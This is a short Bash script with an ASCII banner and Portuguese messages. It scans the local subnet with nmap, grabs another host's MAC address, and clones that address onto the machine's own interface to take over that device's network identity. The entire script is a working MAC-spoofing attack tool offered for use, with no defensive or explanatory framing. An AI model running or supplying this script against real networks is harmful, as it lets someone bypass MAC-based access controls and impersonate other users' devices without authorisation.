#!/bin/bash 
# by RP

echo '........................................................................ '
echo '             __  __ _                            _        ___  '
echo '            | \  / | | __ _ _   ___  __ __   __ / |      / _ \  '         
echo '            | |\/| | |/ _` | | | \ \/ / \ \ / / | |     | | | |  '
echo '            | |  | | | (_| | |_| |>  <   \ V /  | |  _  | |_| |      '
echo '            |_|  |_|_|\__, |\__,_/_/\_\   \_/   |_| (_)  \___/           '
echo '                      |___/                                              '          
echo '                                                                          '
echo '.........................................................................'


echo "Scaneando...."
sleep 1 
echo "Loading"

sleep 1

	export ip=$(ifconfig | grep inet | tail -2 | cut -d ":" -f2 | grep Bcast | cut -d "." -f1,2,3)
       

sleep 1
	export mac=$(nmap -sP $ip.1-255 | grep MAC | cut -d " " -f3 | tail -1)
         
echo "Obtendo Credencial"

	export ith=$(ifconfig | grep HW | tail -1 | cut -d " " -f1)

echo "Desabilitando rede..."

ifconfig $ith down

sleep 5

echo "Assumindo Identidade..."

ifconfig $ith hw ether $mac 

echo ""

sleep 6	

echo "Ativando Rede..."
	
ifconfig $ith up 

echo "Processo concluido...!!!"












